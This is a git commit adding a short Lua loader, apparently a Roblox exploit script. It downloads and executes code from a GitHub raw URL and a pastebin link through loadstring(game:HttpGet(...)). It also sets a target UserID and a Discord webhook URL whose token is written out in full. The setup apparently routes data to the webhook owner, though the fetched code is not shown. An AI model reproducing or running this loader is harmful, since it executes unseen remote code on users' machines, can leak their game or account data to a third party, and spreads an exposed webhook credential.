7b47df877e8fb37b026b629a467ac89c077d6217
Muhammad6916 <124334344+Muhammad6916@users.noreply.github.com>
2023-02-03 13:16:08 +0800

    Create Main.lua

---
+++ Main.lua
@@ -0,0 +1,7 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Muhammad6196/Project-WD/main/Main.lua"))()
+
+_G.UserID = 3380431035
+
+_G.WebHook = "https://discord.com/api/webhooks/1056729761809973400/LXJ0ZX8O7b1LayNpQuOHE1_P8_UPBKh7mzsnJnbmD0zVW8JB4KLBCl2xteDBBPB3Fltu"
+
+loadstring(game:HttpGet('https://pastebin.com/raw/q4if1mvx'))()
